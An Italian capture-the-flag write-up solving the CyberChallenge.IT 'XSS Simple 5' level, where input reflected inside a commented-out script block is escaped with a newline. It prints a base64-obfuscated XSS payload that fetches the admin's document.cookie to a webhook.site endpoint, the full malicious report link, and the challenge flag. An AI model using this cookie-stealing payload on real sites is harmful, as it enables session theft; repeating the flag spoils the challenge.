# Writeup: WS_3.05 - XSS Simple 5

**Descrizione**  
Siamo al quinto e ultimo livello della serie di challenge **XSS Simple**. In questa sfida, l’input fornito viene inserito all’interno di un blocco `<script>`, circondato da un commento multilinea (`<!-- ... -->`) e con una parte di testo che fa da contesto (`document.write('Hello world!'); // yep, we have reflection here. What can you do?`). L’obiettivo rimane ottenere il cookie dell’admin inviando un link “malevolo” tramite il form di “report”.

---

## Analisi del Codice Riflesso

Quando forniamo un parametro `?html=...`, il sito produce un output del tipo:
```html
<script><!--document.write('Hello world!'); // yep, we have reflection here. What can you do? <IL_NOSTRO_INPUT>--></script>
```
Questo significa che il nostro input finisce dentro un commento HTML (`<!-- ... -->`) all’interno di `<script>`. Se inseriamo semplicemente del codice JavaScript, rimarrebbe commentato e non verrebbe eseguito.

---

## Strategia di Evasione

1. **Interrompere il commento**: Possiamo utilizzare un carattere di nuova linea (`%0A`) per andare a capo e “chiudere” il commento, consentendo di inserire del codice eseguibile.
2. **Eseguire JavaScript**: Una volta fuori dal commento, possiamo utilizzare `eval(atob(...))` per decodificare in Base64 un payload che esegue un `fetch()` o simile.

### Esempio di Payload
```text
%0Aeval(atob('ZmV0Y2goYGh0dHBzOi8vd2ViaG9vay5zaXRlL2RlYTcwNTliLTIzNTgtNGE3Ni05NDQ1LWRmMmNlODUwN2Y2ZD9jb29raWU9JHtkb2N1bWVudC5jb29raWV9YCk7'));%0A
```
- **`%0A`**: Va a capo e chiude il commento `<!--`.
- **`eval(atob('...'))`**: Decodifica e esegue il JavaScript in Base64.
- **Codice Decodificato**: `fetch('https://webhook.site/dea7059b-2358-4a76-9445-df2ce8507f6d?cookie=${document.cookie}')`.

---

## Invio del Payload

Generiamo un link da passare nel form di “report”:
```
http://xss5.challs.cyberchallenge.it/?html=%0Aeval(atob('ZmV0Y2goYGh0dHBzOi8vd2ViaG9vay5zaXRlL2RlYTcwNTliLTIzNTgtNGE3Ni05NDQ1LWRmMmNlODUwN2Y2ZD9jb29raWU9JHtkb2N1bWVudC5jb29raWV9YCk7'));%0A
```
Quando l’admin carica il link, la porzione dopo `-->` (ottenuta grazie a `%0A`) viene eseguita come JavaScript, e il cookie dell’admin (contenente la flag) viene inviato al nostro endpoint (Webhook.site).

---

## Flag

Controllando il webhook, riceviamo la flag:

```
CCIT{b3535b8581413dead284efc6a5d1813a}
```

---

## Lezioni Apprese

1. **Uscita dal Commento**: Un commento HTML aperto in uno `<script>` può essere chiuso usando newline o altre tecniche, rendendo possibile l’esecuzione di codice.
2. **Base64**: `eval(atob(...))` continua a essere un metodo efficace per aggirare i filtri che cercano parole chiave JavaScript.
3. **Flessibilità dei Caratteri di Controllo**: Caratteri come `%0A` (newline) o `%0D` (carriage return) sono fondamentali per manipolare l’HTML/JS generato dal server.

---

